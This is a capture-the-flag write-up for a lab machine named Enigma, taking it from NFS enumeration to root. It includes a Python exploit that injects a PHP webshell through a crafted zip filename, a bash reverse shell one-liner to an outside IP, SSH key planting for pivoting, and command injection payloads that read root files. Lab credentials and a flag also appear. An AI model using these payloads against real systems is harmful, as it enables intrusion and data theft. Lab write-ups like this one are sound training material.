# ENIGMA

## RECON

```
nmap -sV enigma.htb
```
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
110/tcp  open  pop3    Dovecot pop3d
111/tcp  open  rpcbind 2-4 (RPC #100000)
143/tcp  open  imap    Dovecot imapd (Ubuntu)
993/tcp  open  imaps?
995/tcp  open  pop3s?
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### port 2049
NFS service
a file sharing tool just like smb service.
in smb services files are shares in NFS they are called exports.

enumerating files shared in the NFS

```
showmount -e enigma.htb
```
```
Export list for enigma.htb:
/srv/nfs/onboarding *
```

importing those shares to our system
```
sudo mount -t nfs 10.129.204.42:/srv/nfs/onboarding /tmp/nfs_mount
```

had a pdf about the details of the new employee.

<img width="804" height="646" alt="Screenshot 2026-06-29 at 17 59 43" src="https://github.com/user-attachments/assets/f55e8792-2e4c-4de9-90a5-a07d971a1db3" />

```creds ::
username : kevin
password : Enigma2024!
```

<img width="710" height="623" alt="Screenshot 2026-07-06 at 12 09 50" src="https://github.com/user-attachments/assets/b10a0408-c33b-40e2-8642-b6e597011400" />

```
 another user :: sarah
```
trying same password on sarah as she sent the mail to kevin which may have same password.

<img width="713" height="401" alt="Screenshot 2026-07-06 at 12 37 30" src="https://github.com/user-attachments/assets/7d33eafc-bc37-4dea-82ea-
1516189c401a" />

got the creds of admin for ```openSTAmanager``` software.
```
creds ::
URL ::  http://support_001.enigma.htb
Username :: admin
Password :: Ne3s4rtars78s
```

### openSTAManager v2.9.8 - file upload vulnerbility

### cve 2026-69212

file upload vulnerbility where the user can upload a zip file containing .p7m file but the filename can cointain malicious code. basically the file is directly going into the code which make it a part of the code which makes it vulnerble.

https://github.com/devcode-it/openstamanager/security/advisories/GHSA-25fp-8w8p-mx36

creating the zip file 
```import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

uploaded the zip file and shell.php is created in the files directory. with parameter "c". that executes the commands.

got reverse shell from the webshell for www-data user.

``` bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.10/8888+0>%261'```

in /var/www/html/openstamanager/config.inc.php 
```
Database host: localhost
Database username: brollin
Database password: Fri3nds@9099
Database name: openstamanager
```

from brollin/zz_users table ::

```
username  password(hashed)
admin     $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu   - uncracked
haris     $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC   - bestfriends
```

ssh through password is disabled so switch users. -- ``su haris`` 

services running locally 

<img width="693" height="465" alt="Screenshot 2026-07-06 at 13 16 03" src="https://github.com/user-attachments/assets/8c881923-d702-4d94-8bab-b6b7d9692151" />

in port 1337 there is a service running to access it we need to do port forwarding using ssh key authentication.

1 - generate an ssh key for our user. 
``` ssh-keygen -t rsa -b 4096 -f ~/id_rsa_pivot```

2 - copy the public key to paste in the haris user from the reverse shell.( id_rsa_pivot.pub)

3 - paste the public key of our user in /.ssh/authorized_keys file.

port forwarding ::

```ssh -i ~/id_rsa_pivot -L 8080:localhost:1337 haris@10.129.108.212```

now we are able to get the service running in 1337 locally in remote service on our localhost 8080.

### olivetin v3000.10.0 CVE-2026-27626 os command injection 

CVE-2026-27626 - https://github.com/advisories/GHSA-49gm-hh7w-wfvf

olivetin - allows users to run predefined Linux shell commands or scripts via a simple, touch-friendly dashboard.

in the password field it is supporting command injection vulnerbility.

```
payload: 
'; id; echo '

output : uid=0(root) gid=0(root) groups=0(root)
 ```

get the root flag :
```
payload :
'; cat /root/root.txt; echo '
```

```
root flag : 6bf69fdeb746151dfbc3ce455f8630ee
````
